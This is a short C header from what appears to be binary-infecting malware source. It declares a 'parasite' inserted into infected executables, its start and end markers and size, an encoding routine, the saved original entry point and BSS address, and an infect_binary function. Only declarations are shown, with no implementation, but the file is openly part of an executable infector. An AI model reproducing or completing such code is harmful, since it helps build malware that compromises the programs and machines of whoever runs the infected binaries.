/*
 * $Id: parasite.h, this will be inserted into infected binaries
 */

#ifndef PARASITE_H
#define PARASITE_H

#include "sktypes.h"

#ifndef __ASSEMBLY__
extern	void parasite_start();
extern	void parasite_end();
#define PARASITE_SIZE (((char *) parasite_end) - ((char *) parasite_start))
extern	uchar parasite_encode(uchar);
extern  ulong orig_ep;
extern  ulong bss_addr;
extern  ulong bss_len;

int	infect_binary(char *fn, char *exec);
#endif

#define ROLVAL 4

#endif
